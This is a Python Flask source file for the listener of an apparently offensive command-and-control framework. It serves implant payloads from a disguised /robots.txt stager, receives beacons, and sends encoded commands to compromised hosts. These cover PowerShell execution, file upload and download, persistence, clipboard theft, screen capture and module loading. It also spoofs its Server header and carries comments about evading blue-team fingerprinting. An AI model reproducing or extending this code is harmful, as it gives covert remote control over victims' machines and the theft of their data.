from flask import Flask, request
import base64
from uuid import uuid4
import os

from Implant.Implant import ImplantSingleton
from Data.Database import Database

Imp = ImplantSingleton.instance
db = Database()

app = Flask(str(uuid4()))
app.config['SECRET_KEY'] = str(uuid4())


# Adding the functions which manage encoding built in commands for transfer
def craft_sound_file(value_dict, command_id):
    path = f"{os.getcwd()}/Storage/implant_resources/{value_dict['args']}"
    with open(path, 'rb') as file:
        audio = base64.standard_b64encode(file.read()).decode()
        final_audio = f"{value_dict['type']}{command_id}{audio}"
    return final_audio


def craft_powershell_native_command(args, command_id):
    a = base64.b64encode(args['args'].encode()).decode()
    b = args['type']+command_id + a
    return b


def craft_file_upload(value_dict, command_id):
    # Temp dev work:
    arg_dict = value_dict['args'].split(" ")
    local_file = arg_dict[0]
    target_location = arg_dict[1]
    with open (os.getcwd()+"/Storage/implant_resources/"+local_file, 'rb') as file_h:
        a = file_h.read()
        b = base64.b64encode(a).decode()
        final_str = base64.b64encode(target_location.encode()).decode()+"::"+b
        final_str = base64.b64encode(final_str.encode()).decode()
    cc = str(value_dict['type'] + command_id) + final_str
    return cc


def craft_file_download(value_dict, command_id):
    encoded_target_file = base64.b64encode(value_dict['args'].encode()).decode()
    to_return = f"{value_dict['type']}{command_id}{encoded_target_file}"
    return str(to_return)


def craft_enable_persistence(value_dict, command_id):
    return str(value_dict['type'] + command_id)


def craft_sys_info(value_dict, command_id):
    return str(value_dict['type'] + command_id)


def craft_export_clipboard(value_dict, command_id):
    return str(value_dict['type'] + command_id)


def craft_load_module(value_dict, command_id):
    try:
        with open(str(os.getcwd()+"/Storage/implant_resources/modules/"+value_dict['args']+".ps1"), 'r') as fileh:
            to_encode = f"{value_dict['args']}::{fileh.read()}"
            load_module_string = "LM" + command_id + base64.b64encode(to_encode.encode()).decode()
            return load_module_string
    except Exception as e:

        # These exceptions should be added to a log file.
        print(f"Load module failed: {e}")
        pass
    return str("==")


def craft_invoke_module(value_dict, command_id):
    a = base64.b64encode(value_dict['args'].encode()).decode()
    b = value_dict['type'] + command_id + a
    return b


def craft_list_modules(value_dict, command_id):
    return str(value_dict['type'] + command_id)

def craft_screen_capture(value_dict, command_id):
    return str(value_dict['type'] + command_id)

#
preprocessing = {
    "PS": craft_sound_file,
    "CM": craft_powershell_native_command,
    "UF": craft_file_upload,
    "FD": craft_file_download,
    "EP": craft_enable_persistence,
    "SI": craft_sys_info,
    "EC": craft_export_clipboard,
    "LM": craft_load_module,
    "IM": craft_invoke_module,
    "ML": craft_list_modules,
    "SC": craft_screen_capture
    }


@app.before_request
def before_request():
    # TODO: Implement IP whitelist and reject if connection if it is not a valid src IP.
    return


# Removing the Werkzeug header to reduce Fudges server fingerprinting.
@app.after_request
def alter_headers(response):
    response.headers['Server'] = "Apache/2.4.1 (Unix)"
    return response


# -- TODO: extracted and added into a new stager specific listener(?)
@app.route("/robots.txt", methods=['GET'])
def stager():
    # This endpoint is responsible for generating the implant based on stager callbacks
    implant_data = db.implant.Register_NewImplantFromStagerKey(request.values['user'])
    if implant_data:
        output_from_parsed_template = Imp.GeneratePayload(implant_data)
        return output_from_parsed_template
    else:
        return "404", 404


@app.route("/index", methods=["GET", "POST"])
def implant_beacon_endpoint():
    if 'X-Implant' not in request.headers:
        return "=="
    next_cmd, command_id = Imp.issue_command(request.headers['X-Implant'], app.config['listener_type'])
    if next_cmd is not None:
        processed_return_val = preprocessing[next_cmd['type']](next_cmd, command_id)
        return processed_return_val
    # Need to remove the use of == in beacons, this can be fingerprinted with ease.
    return "=="


@app.route("/help", methods=['GET', 'POST'])
def implant_command_result():
    # -- X-Result is a placeholder header and should be changed to a more realistic value
    response_stream_data = request.stream.read()
    decoded_response_stream_data = response_stream_data.decode()
    if "X-Result" in request.headers:

        command_id = decoded_response_stream_data[0:24]
        encoded_command = decoded_response_stream_data[24:]
        decoded_response = base64.b64decode(f"{encoded_command}==")
        Imp.command_response(command_id, decoded_response, app.config['listener_type'])
    return "=="


# This should be randomised to avoid blueteams fingerprinting the server by querying this endpoint.
@app.route("/nlaksnfaobcaowb", methods=['GET', 'POST'])
def shutdown_listener():
    if request.remote_addr == "127.0.0.1":
        shutdown_hook = request.environ.get('werkzeug.server.shutdown')
        if shutdown_hook is not None:
            shutdown_hook()


def shutdown():
    raise RuntimeError("Server going down")
